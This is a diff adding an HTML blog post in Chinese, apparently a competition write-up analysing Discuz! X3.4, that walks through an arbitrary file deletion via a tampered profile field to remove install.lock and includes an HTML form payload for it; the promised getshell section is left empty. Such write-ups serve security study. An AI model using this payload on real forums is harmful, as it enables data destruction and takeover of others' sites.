@@ -1,0 +1,233 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+    <meta name="description" content="">
+    <meta name="author" content="">
+
+    <title>Blog Of SEVENTEEN</title>
+
+    <link rel = "Shortcut Icon" href="../img/favicon.ico">
+
+    <!-- Bootstrap core CSS -->
+    <link href="../vendor/bootstrap/css/bootstrap.min.css" rel="stylesheet">
+
+    <!-- Custom fonts for this template -->
+    <link href="../vendor/fontawesome-free/css/all.min.css" rel="stylesheet" type="text/css">
+    <link href='https://fonts.googleapis.com/css?family=Lora:400,700,400italic,700italic' rel='stylesheet'
+          type='text/css'>
+    <link href='https://fonts.googleapis.com/css?family=Open+Sans:300italic,400italic,600italic,700italic,800italic,400,300,600,700,800'
+          rel='stylesheet' type='text/css'>
+
+    <!-- Custom styles for this template -->
+    <link href="../css/clean-blog.min.css" rel="stylesheet">
+
+    <!-- Code highlight-->
+    <link rel="stylesheet" href="../highlight/styles/rainbow.css">
+
+</head>
+
+<body>
+
+<!-- Navigation -->
+<nav class="navbar navbar-expand-lg navbar-light fixed-top" id="mainNav">
+    <div class="container">
+        <a class="navbar-brand" href="../index.html">Index</a>
+        <button class="navbar-toggler navbar-toggler-right" type="button" data-toggle="collapse"
+                data-target="#navbarResponsive" aria-controls="navbarResponsive" aria-expanded="false"
+                aria-label="Toggle navigation">
+            Menu
+            <i class="fas fa-bars"></i>
+        </button>
+        <div class="collapse navbar-collapse" id="navbarResponsive">
+            <ul class="navbar-nav ml-auto">
+                <li class="nav-item">
+                    <a class="nav-link" href="../index.html">Home</a>
+                </li>
+                <li class="nav-item">
+                    <a class="nav-link" href="../about.html">About</a>
+                </li>
+                <li class="nav-item">
+                    <a class="nav-link" href="../contact.html">Contact</a>
+                </li>
+            </ul>
+        </div>
+    </div>
+</nav>
+
+<!-- Page Header -->
+<header class="masthead" style="background-image: url('../img/post-bg.jpeg')">
+    <div class="overlay"></div>
+    <div class="container">
+        <div class="row">
+            <div class="col-lg-8 col-md-10 mx-auto">
+                <div class="post-heading">
+                    <h1>discuz! x3.4 漏洞分析</h1>
+                    <h2 class="subheading">从任意文件删除漏洞到getshell</h2>
+                    <span class="meta">Posted by
+              <a href="#">SEVENTEEN</a>
+              on June 22, 2021</span>
+                </div>
+            </div>
+        </div>
+    </div>
+</header>
+
+<!-- Post Content -->
+<article>
+    <div class="container">
+        <div class="row">
+            <div class="col-lg-8 col-md-10 mx-auto">
+
+                <h2 class="section-heading">前言</h2>
+
+                <p>&nbsp;&nbsp;&nbsp;红名谷线下半决赛遇到的一个PHP论坛，据说这个论坛有几个很精彩的漏洞，这次来玩一玩。
+                	因为找不到什么文章，所以基本上的思路是利用任意文件删除来删除install.lock，然后再重装到后台使用命令执行漏洞。</p>
+
+                <h2 class="section-heading">配置环境</h2>
+
+                <p>&nbsp;&nbsp;&nbsp;首先到GitHub下载源码，我用的是(https://github.com/mektap/Discuz-3.4-Uyghurche)。</p>
+
+                <a href="#">
+                    <img class="img-fluid" src="../img/2021-6-22/install.jpg" alt="">
+                </a>
+                
+                <h2 class="section-heading">任意文件删除漏洞</h2>
+                
+                <p>&nbsp;&nbsp;&nbsp;先在首页注册一个账号，然后到设置页面源码里面找到formhash保存起来，一会还要用到。</p>
+
+                <a href="#">
+                    <img class="img-fluid" src="../img/2021-6-22/pop-1.jpg" alt="">
+                </a>
+                
+                <p>&nbsp;&nbsp;&nbsp;对保存这个按钮事件触发的请求包抓包，把数据包中的出生地改成要删除文件的相对路径。</p>
+
+                <a href="#">
+                    <img class="img-fluid" src="../img/2021-6-22/pop-2.jpg" alt="">
+                </a>
+                
+                <p>&nbsp;&nbsp;&nbsp;可以看到页面出生地的地方回显成刚刚修改的相对路径。</p>
+
+                <a href="#">
+                    <img class="img-fluid" src="../img/2021-6-22/pop-3.jpg" alt="">
+                </a>
+                
+                <p>&nbsp;&nbsp;&nbsp;构造一个payload来上传文件，这里的formhash记得改成一开始从前端获取到的那个。</p>
+
+                <a href="#">
+                    <img class="img-fluid" src="../img/2021-6-22/pop-4.jpg" alt="">
+                </a>
+                
+                <p>&nbsp;&nbsp;&nbsp;这里贴一下payload的源码。</p>
+                
+                
+                <div>
+                	
+                	<pre class='hljs'><code>&lt;body&gt;
+    &lt;form action=<span class="hljs-string">"http://[网站域名]/home.php?mod=spacecp&amp;ac=profile&amp;op=base&amp;profilesubmit=1&amp;formhash=[刚刚得到的formhash]"</span> <span class="hljs-keyword">method</span>=<span class="hljs-string">"post"</span> enctype=<span class="hljs-string">"multipart/form-data"</span>&gt;
+        &lt;input <span class="hljs-keyword">type</span>=<span class="hljs-string">"file"</span> name=<span class="hljs-string">"birthprovince"</span> /&gt;
+        &lt;input <span class="hljs-keyword">type</span>=<span class="hljs-string">"submit"</span> value=<span class="hljs-string">"upload"</span> /&gt;
+    &lt;/form&gt;
+&lt;/body&gt;</code></pre>
+                	
+                </div>
+                
+                
+                <p>&nbsp;&nbsp;&nbsp;接着，在本地表单上传一张喜欢的照片。(不喜欢的其实也行)</p>
+
+                <a href="#">
+                    <img class="img-fluid" src="../img/2021-6-22/pop-5.jpg" alt="">
+                </a>
+                
+                <p>&nbsp;&nbsp;&nbsp;可以看到uc_server/data目录下的install.lock已经被删除啦！</p>
+
+                <a href="#">
+                    <img class="img-fluid" src="../img/2021-6-22/pop-6.jpg" alt="">
+                </a>
+                
+                <p>&nbsp;&nbsp;&nbsp;来看一下在源码里面到底发生了什么。</p>
+
+                <a href="#">
+                    <img class="img-fluid" src="../img/2021-6-22/pop-7.jpg" alt="">
+                </a>
+                
+                
+                
+                
+                
+                
+                
+                
+
+								<h2 class="section-heading">后台getshell漏洞</h2>
+
+
+           
+                <h2 class="section-heading">There Is Nothing Below</h2>
+                <p>&nbsp;&nbsp;&nbsp;</p>
+
+                <a href="#">
+                    <img class="img-fluid" src="../img/post-bg.jpeg" alt="">
+                </a>
+                <span class="caption text-muted">Turn at the next intersection.</span>
+
+                <blockquote class="blockquote">
+                </blockquote>
+
+            </div>
+        </div>
+    </div>
+</article>
+
+<hr>
+
+<!-- Footer -->
+<footer>
+    <div class="container">
+        <div class="row">
+            <div class="col-lg-8 col-md-10 mx-auto">
+                <ul class="list-inline text-center">
+                    <li class="list-inline-item">
+                        <a href="#">
+                <span class="fa-stack fa-lg">
+                  <i class="fas fa-circle fa-stack-2x"></i>
+                  <i class="fab fa-twitter fa-stack-1x fa-inverse"></i>
+                </span>
+                        </a>
+                    </li>
+                    <li class="list-inline-item">
+                        <a href="#">
+                <span class="fa-stack fa-lg">
+                  <i class="fas fa-circle fa-stack-2x"></i>
+                  <i class="fab fa-facebook-f fa-stack-1x fa-inverse"></i>
+                </span>
+                        </a>
+                    </li>
+                    <li class="list-inline-item">
+                        <a href="#">
+                <span class="fa-stack fa-lg">
+                  <i class="fas fa-circle fa-stack-2x"></i>
+                  <i class="fab fa-github fa-stack-1x fa-inverse"></i>
+                </span>
+                        </a>
+                    </li>
+                </ul>
+                <p class="copyright text-muted">Copyright &copy; SEVENTEEN 2021</p>
+            </div>
+        </div>
+    </div>
+</footer>
+
+<!-- Bootstrap core JavaScript -->
+<script src="../vendor/jquery/jquery.min.js"></script>
+<script src="../vendor/bootstrap/js/bootstrap.bundle.min.js"></script>
+
+<!-- Custom scripts for this template -->
+<script src="../js/clean-blog.min.js"></script>
+
+</body>
+
+</html>
